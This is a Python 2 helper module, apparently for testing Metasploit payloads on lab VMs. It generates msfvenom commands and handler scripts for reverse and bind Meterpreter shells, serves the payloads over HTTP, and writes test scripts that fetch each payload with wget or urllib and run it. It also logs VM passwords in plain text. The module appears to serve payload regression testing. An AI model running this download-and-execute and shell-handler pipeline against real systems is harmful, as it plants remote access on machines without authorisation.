from datetime import datetime
import os
import time
import json
from __builtin__ import False

#
# GOT TIRED OF TRACKING THIS DATA IN A LIST
# 
class payloadData:
    def __init__(self, targetVmIp, payloadName, payloadType, venomCmd, rcScriptName, rcScriptContent):
        self.targetVmIp =      targetVmIp
        self.payloadName =     payloadName
        self.payloadType =     payloadType
        self.venomCmd =        venomCmd
        self.rcScriptName =    rcScriptName
        self.rcScriptContent = rcScriptContent

class portValue:
    """
    THE BELOW portValue CLASS IS HOW I DECIDED TO TRACK THE PORT NUMBERS
    I WANTED A SINGLETON, BUT I FOUND NOTHING IN PYTHON THAT DID THAT.
    THIS CLASS LETS ME SIMPLY CALL get.portValue() AND IT RETURNS A 
    UNIQUE PORT VALUE, SO I DO NOT HAVE TO TRACK WHICH VALUES HAVE BEEN USED.
    """
    def __init__(self, initialValue):
        self.portNumber = initialValue
        
    def get(self):
        self.portNumber = self.portNumber + 1
        return self.portNumber

def loadJson(fileName):
    """
    READ IN THE JSON FILES AND RETURN A DICTIONARY
    GOT TIRED OF WRITING THE TRY/CATCH BLOCKS IN A COUPLE PLACES
    """
    retDict = None
    try:
        fileObj = open(fileName, 'r')
        jsonStr = fileObj.read()
        fileObj.close()
    except IOError as e:
        logMsg("FAILED TO FIND JSON FILE " + fileName + "\n" + str(e))
        return retDict
    try:
        retDict = json.loads(jsonStr)
    except ValueError as f:
        logMsg("FAILED TO PARSE JSON FILE " + fileName + "\n" + str(f))
    return retDict

def makeBindLaunchScript(devVmIp, msfPath, testVms, httpPort, scriptName):
    """
    makeBindLaunchScript CREATES A BASH SCRIPT TO LAUNCH THE BIND CALL-INS
    WITH THE CREATED RC SCRIPTS
    """
    scriptContent = "#!/bin/bash -l \n\n"
    scriptContent = scriptContent + "cd " + msfPath + "\n"
    for i in testVms:
        for j in i.payloadList:
            #ADD COMMENT AND LINE BREAK FOR READABILITY
            scriptContent = scriptContent + '\n\n##########################\n#' + j.payloadName + '\n#\n'
            if 'bind' in j.payloadName.lower(): 
                scriptContent = scriptContent + './msfconsole -qr '+ j.rcScriptName + ' > ' + j.rcScriptName + '.out &\n'
                scriptContent = scriptContent + 'sleep 1 > ' + j.rcScriptName + '.out &\n'
    bindScript = open(scriptName, 'wb')
    bindScript.write(scriptContent)
    bindScript.close()

    
def makeDevPayloadScript(devVmIp, msfPath, testVms, httpPort, scriptName, commitFileName):
    """
     makeDevPayloadScript CREATES A BASH SCRIPT TO:
     -CREATE A TEMPORARY PAYLOAD DIRECTORY
     -CREATE THE REQUIRED MSFPAYLOADS FROM THE COMMANDS IN THE PAYLOADS LIST
     -MOVE THE PAYLOADS INTO THE TEMP DIRECTORY
     -CREATE THE RESOURCE SCRIPTS FOR THE HANDLERS
     -START THE REVERSE PAYLOAD HANDLERS
     -START AN HTTP SERVER TO SERVE THE PAYLOADS TO THE TEST VMS
    """
    logMsg("GENERATING PAYLOAD CREATION/REVERSE HANDLER SCRIPT")
    scriptContent = "#!/bin/bash -l \n\n"
    scriptContent = scriptContent + "cd " + msfPath + "\n"
    scriptContent = scriptContent + "mkdir test_payloads\n"
    scriptContent = scriptContent + "git fetch --all\n"
    scriptContent = scriptContent + "git pull\n"
    scriptContent = scriptContent + "git log | head -n 1 > " + commitFileName + "\n"
    scriptContent = scriptContent + "gem install bundler\n"
    scriptContent = scriptContent + "bundle install\n"
    """
     FOR EVERY PAYLOAD, ADD SCRIPT CONTENT TO:
     - CREATE PAYLOAD
     - GENERATE CUSTOM RC SCRIPT TO HANDLE SESSION CREATION AND TESTING
     - MOVE PAYLOAD TO TEMPORARY DIRECTORY
     - LAUNCH HANDLER IF PAYLOAD IS A REVERSE PAYLOAD
    """
    for i in testVms:
        for j in i.payloadList:
            #ADD COMMENT AND LINE BREAK FOR READABILITY
            scriptContent = scriptContent + '\n\n##########################\n#' + j.payloadName + '\n#\n'
            #ADD MSFVENOM PAYLOAD CREATION COMMAND
            scriptContent = scriptContent + './' + j.venomCmd + '\n'
            #ADD BASH CONTENT TO GENERATE RC SCRIPT FOR PAYLOAD
            scriptContent = scriptContent + j.rcScriptContent.strip() + '\n'
            #MOVE PAYLOAD TO TEMP DIRECTORY
            scriptContent = scriptContent + 'mv ' + j.payloadName +' ./test_payloads/'+ j.payloadName + '\n'
            #LAUNCH REVERSE HANDLERS IN RC SCRIPT
            if 'reverse' in j.payloadName.lower(): 
                scriptContent = scriptContent + './msfconsole -qr '+ j.rcScriptName + ' > ' + j.rcScriptName + '.out &\n'
                scriptContent = scriptContent + 'sleep 2\n'
        
    scriptContent = scriptContent + "cd test_payloads\n"
    """
    SERVE PAYLOADS
    """
    scriptContent = scriptContent + "python -m SimpleHTTPServer " + str(httpPort) + " &\n"
    """
    WRITE SCRIPT TO FILE
    """
    venomScript = open(scriptName, 'wb')
    venomScript.write(scriptContent)
    venomScript.close()
    logMsg("PAYLOAD CREATION/REVERSE HANDLER SCRIPT SAVED AS: " + scriptName)

"""
makeMetCmd()
CREATES A TUPLE MADE UP OF
- THE PAYLOAD FILENAME
- THE VENOM COMMAND TO CREATE THE PAYLOAD
- THE NAME OF THE RC SCRIPT TO RUN THE CUSTOM HANDLER
- THE TEXT FOR A CUSTOM RC SCRIPT TO SET UP THE CONNECTION AND TEST THE PAYLOAD
"""

def makeMetCmd(payloadType, msfIp, targetVmIp, metPort, cmdList):
    """
    makeMetCmd CREATES THE REQUIRED msfvenom COMMANDS AND RC SCRIPT
    FILES FOR THE PAYLOADS AND OSs LISTED
    """
    hostType = ""
    targetId = 'x'.join(targetVmIp.split('.'))
    """
    BIND OR REVERSE_TCP?
    """
    if 'bind' in payloadType.lower():
        payloadIp = targetVmIp
        hostType = "RHOST"
    else:
        payloadIp = msfIp
        hostType = "LHOST"

    """
    PATCHUP METERPRETER?
    """
    if 'patch' in payloadType.lower():
        payloadName = targetId + "_patchup_" + payloadType.split('/')[-1] + "_" + metPort + "_" + payloadIp.split('.')[3]
    else:
        payloadName = targetId + "_" + payloadType.split('/')[-1] + "_" + metPort + "_" + payloadIp.split('.')[3]
    rcScriptName = payloadName + '.rc'
    
    """
    WHAT FILE EXTENSION SHOULD WE USE?
    """
    if 'windows' in payloadType.lower():
        payloadName = payloadName + ".exe"
        execFormat = '-f exe'
    elif 'python' in payloadType.lower():
        payloadName = payloadName + ".py"
        execFormat = ''
    elif 'java' in payloadType.lower():
        payloadName = payloadName + ".jar"
        execFormat = ''
    elif 'mettle' in payloadType.lower():
        payloadName = payloadName + ".elf"
        execFormat = '-f elf'
    else:
        logMsg("UNKNOWN PAYLOAD TYPE: " + payloadType.lower())
        payloadName = payloadName
        execFormat = ''
        
    venomCmd = "msfvenom -p " + payloadType + " " + execFormat 
    venomCmd = venomCmd + " -o " +payloadName + " LHOST=" + payloadIp + " LPORT=" + metPort
    if 'rc4' in payloadType.lower():
        venomCmd = venomCmd + " RC4PASSWORD=secret"
    rubySleep = "echo '<ruby>' >> " + rcScriptName + '\n'
    rubySleep = rubySleep + "echo '    sleep(2)' >> " + rcScriptName + '\n'
    rubySleep = rubySleep + "echo '</ruby>' >> " + rcScriptName + '\n'

    rcScriptContent = "# HANDLER SCRIPT FOR " + venomCmd +" \n"
    rcScriptContent = rcScriptContent + "echo 'use exploit/multi/handler ' > " + rcScriptName + "\n"
    rcScriptContent = rcScriptContent + rubySleep
    rcScriptContent = rcScriptContent + "echo 'set payload " + payloadType +"' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + rubySleep
    rcScriptContent = rcScriptContent + "echo 'set " + hostType + " " + payloadIp + "' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + rubySleep
    rcScriptContent = rcScriptContent + "echo 'set LPORT " + metPort + "' >> " + rcScriptName + '\n'
    if 'rc4' in payloadType.lower():
        rcScriptContent = rcScriptContent + rubySleep
        rcScriptContent = rcScriptContent + "echo 'set RC4PASSWORD secret' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + rubySleep
    rcScriptContent = rcScriptContent + "echo 'run -z' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo '<ruby>' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo '    while framework.sessions.count == 0 do '>> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo '        sleep(1)' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo '    end' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo '    sleep(2)' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo '</ruby>' >> " + rcScriptName + '\n'
    for i in cmdList:
        rcScriptContent = rcScriptContent + rubySleep
        rcScriptContent = rcScriptContent + "echo '" + i + "' >> " + rcScriptName + '\n'
    rcScriptContent = rcScriptContent + "echo 'exit -y' >> " + rcScriptName + '\n'
    return payloadData(targetVmIp, payloadName, payloadType, venomCmd, rcScriptName, rcScriptContent)

def makeShTestVmScript(devVmIp, msfPath, testVm, scriptName, testDict):
    remotePath =    testDict['NIX_PAYLOAD_DIRECTORY']
    httpPort =      testDict['HTTP_PORT']
    shTestScript = "# AUTOGENERATED TEST SCRIPT \n"
    shTestScript = shTestScript + "cd " + remotePath + " \n"
    for payloadData in testVm.payloadList:
        url = "'http://" + devVmIp + ":" + str(httpPort) + "/" + payloadData.payloadName + "'"
        shTestScript = shTestScript + "\nwget " + url + "\n"
        shTestScript = shTestScript + "sleep 5 \n"
        shTestScript = shTestScript + "chmod 755 " + payloadData.payloadName + "\n"
        if '.py' in payloadData.payloadName:
            shTestScript = shTestScript + "python " + payloadData.payloadName + "&\n"
        elif '.jar' in payloadData.payloadName:
            shTestScript = shTestScript + "java -jar " + payloadData.payloadName + "&\n"
        elif '.elf' in payloadData.payloadName:
            shTestScript = shTestScript + "./" + payloadData.payloadName + "&\n"
    shScript = open(scriptName, 'wb')
    shScript.write(shTestScript)
    shScript.close()

def makePyTestVmScript(devVmIp, msfPath, testVm, scriptName, testDict):
    remotePath = testDict['WIN_PAYLOAD_DIRECTORY']
    httpPort = testDict['HTTP_PORT']

    pyTestScript = "# AUTOGENERATED TEST SCRIPT \n"
    pyTestScript = pyTestScript + "import subprocess\n"
    pyTestScript = pyTestScript + "import time\n"
    pyTestScript = pyTestScript + "import tempfile\n"
    pyTestScript = pyTestScript + "import urllib\n\n"
    
    """
    functionally, we need to create the following code for each payload:
    Download it
      url = 'http://<devVmIp>:<httpPort>/<payloadName>'
      filename = '<payloadName>'
      urllib.urlretrieve(url, filename)
    execute it
    """
    for i in testVm.payloadList:
        pyTestScript = pyTestScript + "url = 'http://" + devVmIp + ":" + str(httpPort) + "/" + i.payloadName + "'\n"
        pyTestScript = pyTestScript + "fileName = r'" + remotePath + "/" + i.payloadName + "'\n"
        if '.py' in i.payloadName:
            pyTestScript = pyTestScript + "cmdList = [r'" + testDict['TEST_PYTHON_EXE'] +"', fileName]\n"
        elif 'jar' in i.payloadName:
            pyTestScript = pyTestScript + "cmdList = [r'" + testDict['TEST_JAVA_EXE'] + "','-jar', fileName]\n"
        else:
            pyTestScript = pyTestScript + "cmdList = [fileName]\n"
        pyTestScript = pyTestScript + "try:\n"
        pyTestScript = pyTestScript + "  urllib.urlretrieve(url, fileName)\n"
        pyTestScript = pyTestScript + "  subprocess.Popen(cmdList)\n"
        pyTestScript = pyTestScript + "except IOError as ioexep:\n"
        pyTestScript = pyTestScript + "  print 'Error when launching ' + str(cmdList), ioexep\n"
        pyTestScript = pyTestScript + "except WindowsError as winerr:\n"
        pyTestScript = pyTestScript + "  print 'Error when launching ' + str(cmdList), winerr\n"
        pyTestScript = pyTestScript + "except:\n"
        pyTestScript = pyTestScript + "  print 'God only knows what happened'\n"
        pyTestScript = pyTestScript + "time.sleep(5)\n"
    pyScript = open(scriptName, 'wb')
    pyScript.write(pyTestScript)
    pyScript.close()


def generateReport(fileList, testVmList, reportFileName, sessionDir, commitVersion):
    reportFile = open(reportFileName, 'wb')
    for i in testVmList:
        for j in i.payloadList:
            try:
                logMsg(str(i.resultDict[j.payloadType]))
            except ValueError as e:
                logMsg(e + "WAS NOT FOUND")
                continue
            if i.resultDict[j.payloadType]:
                testResult = "PASSED"
            else:
                testResult = "FAILED"
            reportFile.write("################################################################################\n")
            reportFile.write("#\n")
            reportFile.write("#                IP ADDRESS:   " + j.targetVmIp + '\n')
            reportFile.write("#                VM NAME:      " + i.vmName + '\n')
            reportFile.write("#                PAYLOAD TYPE: " + j.payloadType + '\n')
            reportFile.write("#                COMMIT:       " + commitVersion + '\n')
            reportFile.write("#                TEST RESULT:  " + testResult + '\n')
            reportFile.write("#\n")
            reportFile.write("################################################################################\n")
            if sessionDir + "/" + j.rcScriptName + '.out' in fileList:
                outFile = open(sessionDir + "/" + j.rcScriptName + '.out', 'r')
                fileContent = outFile.readlines()
                outFile.close()
                for j in fileContent:
                    reportFile.write(j)
                reportFile.write("\n\n")
            else:
                print "CANNOT FIND FILE " + sessionDir + "/" + j.rcScriptName + '.out'
                reportFile.write("!!!!!!!!!!!!!!!!!!! MISSING !!!!!!!!!!!!!!!!!!!!!!!!!\n\n")
    reportFile.close()
    return reportFileName

def populateResults(fileList, testVmList, dataDict):
    payloadResults = {}
    successList = dataDict['SUCCESS_LIST']
    sessionDir = dataDict['SESSION_DIR']
    for i in testVmList:
        payloadResults[i.vmName] = {}
        for j in i.payloadList:
            testsPassed = True
            sessionFile = sessionDir + "/" + j.rcScriptName + '.out'
            failedArtifacts = []
            if sessionFile in fileList:
                try:
                    outFile = open(sessionDir + "/" + j.rcScriptName + '.out', 'r')
                    fileContent = outFile.read()
                    outFile.close()
                except IOError as e:
                    logMsg("SESSION DUMP FILE: " + sessionFile + " SHOULD BE THERE, BUT IS NOT")
                    logMsg("SYSTEM ERROR:\n" + str(e))
                    continue
                for k in successList:
                    if k not in fileContent:
                        logMsg(i.vmName + ":" + str(j.payloadType) + " FAILED: " + k)
                        failedArtifacts.append(k)
                        testsPassed = False
            else:
                logMsg("COULD NOT FIND SESSION DUMP FILE: " " ")
                testsPassed = False
            i.resultDict[j.payloadType] = testsPassed
            payloadResults[i.vmName][j.payloadType] = failedArtifacts
            logMsg(str(i.resultDict))
    return payloadResults

def printResults(testVmList):
    for i in testVmList:
        for j in i.payloadList:
            if i.resultDict[j.payloadType]:
                logMsg('[PASSED]' + i.vmName + ':' + str(j.payloadType))
            else:
                logMsg('[FAILED]' + i.vmName + ':' + str(j.payloadType))

def generateHtmlReport(resultsDic, fileName, testVms, commitVersion, dataDict):
    payloadTypes =  dataDict['PAYLOAD_LIST']
    testName =      dataDict['TEST_NAME']
    
    vmList = []
    htmlStr = "<html>\n<head>\n<title>\n\t" + testName + "\n</title>\n</head>\n\n<body>\n"        
    if ('TEST_PYTHON_EXE' in dataDict):
        htmlStr = htmlStr + "<BR> PYTHON EXE PATH: " + dataDict['TEST_PYTHON_EXE'] + "<BR>\n"
    if ('TEST_JAVA_EXE' in dataDict):
        htmlStr = htmlStr + "<BR> JAVA EXE PATH: " + dataDict['TEST_JAVA_EXE'] + "<BR>\n"
    htmlStr = htmlStr + "<table border=\"1\">\n"
    htmlStr = htmlStr + "<tr><td><center><strong>" + testName + "<BR>" + commitVersion + "</strong></td>"
    for vm in resultsDic:
        htmlStr = htmlStr + "<td>" + vm + "</td>"
        vmList.append(vm)
    for payload in payloadTypes:
        htmlStr = htmlStr + "<tr>\n\t<td>" + payload + "</td>"
        for operatingSystem in vmList:
            try:
                if len(resultsDic[operatingSystem][payload]) == 0:
                    htmlStr = htmlStr + "\t<td bgcolor = \"#00cc00\">PASSED</td>\n"
                else:
                    htmlStr = htmlStr + "\t<td bgcolor = \"#cc0000\">FAILED"
                    for failureArtifact in resultsDic[operatingSystem][payload]:
                        htmlStr = htmlStr + "<BR>" + failureArtifact
                    htmlStr = htmlStr + "\t</td>"
            except KeyError:
                htmlStr = htmlStr + "\t<td bgcolor = \"#7D7D7D\">NA</td>\n"
        htmlStr = htmlStr + "</tr>\n"
    htmlStr = htmlStr + "</table>\n</body>\n</html>\n"
    try:
        fileObj = open(fileName, 'wb')
        fileObj.write(htmlStr)
        fileObj.close()
    except IOError:
        return False
    return True

def makeWebResults(testVmList, fileName):
    try:
        fileObj = open(fileName, 'wb')
    except IOError:
        return False
    fileObj.write("<html>\n<head>\n<title>\n\tTEST RESULTS\n</title>\n</head>\n\n<body>\n")
    fileObj.write("<table border=\"1\">\n<tr><td>PAYLOAD</td><td>VIRTUAL MACHINE</td><td>STATUS</td></tr>\n")
    for i in testVmList:
        for j in i.payloadList:
            if i.resultDict[j.payloadType]:
                fileObj.write("<tr> " + \
                              "<td>" + str(j.payloadType) + "</td>" + \
                              "<td>" + i.vmName + "</td>" + \
                              "<td bgcolor = \"#00cc00\">PASSED</td></tr>\n")
            else:
                fileObj.write("<tr>" + \
                              "<td>" + str(j.payloadType) + "</td>" + \
                              "<td>" + i.vmName + "</td>" + \
                              "<td bgcolor = \"#cc0000\">FAILED</td></tr>\n")
    fileObj.write("</table>\n</body>\n</html>\n")
    fileObj.close()
    return True

def getListFromFile(fileName):
    retList = []
    logMsg("GETTING COMMANDS FROM " + str(fileName))
    if fileName != None:
        with open(fileName, 'r') as fileObj:
            for i in fileObj.readlines():
                if '#' != i.strip()[0]:
                    retList.append(i.strip())
    logMsg(str(retList))
    return retList

def logMsg(strMsg, logFile = 'stdout', newline = True):
    if strMsg == None:
        strMsg="[None]"
    if newline:
        strMsg = strMsg + '\n'
    dateStamp = '[' + str(datetime.now())+ '] '
    if logFile.lower() == 'stdout':
        print dateStamp + strMsg,
    else:
        logFileObj = open(logFile, 'wb')
        logFileObj.write(dateStamp + strMsg)
        logFileObj.close()
    
def selectVms(vmList, posFilter=None):
    menuVms = []
    selectedVmList = []
    for i in vmList:
        if (posFilter == None) or (posFilter.upper() in i.vmIdentifier.upper()):
            menuVms.append(i)
    for i in range(len(menuVms)):
            print str(i) + " " + menuVms[i].vmIdentifier  
    feedBack = raw_input(">> ")
    print "SELECTION: " + feedBack +'\n'
    feedbackList = feedBack.split(',')
    for i in feedbackList:
        selectedVmList.append(menuVms[int(i)])
    return selectedVmList

def findAndConfigVms(vmList, vmDataList):
    foundVmList = []
    for vmData in vmDataList:
        try:
            vmName =        vmData['VM_NAME']
            vmUsername =    vmData['VM_USERNAME']
            vmPassword =    vmData['VM_PASSWORD']
        except KeyError as e:
            logMsg("[JSON PARSE ERROR]: COULD NOT FIND VALUE " + \
                    str(e))
            continue
        for j in vmList:
            if vmName.lower() in j.vmName.lower():
                foundVmList.append(j)
                logMsg("ADDING USERNAME " + vmUsername + " PASSWORD " + vmPassword + " TO " + vmName + " : " + j.vmName)
                j.setPassword(vmPassword)
                j.setUsername(vmUsername)
    return foundVmList
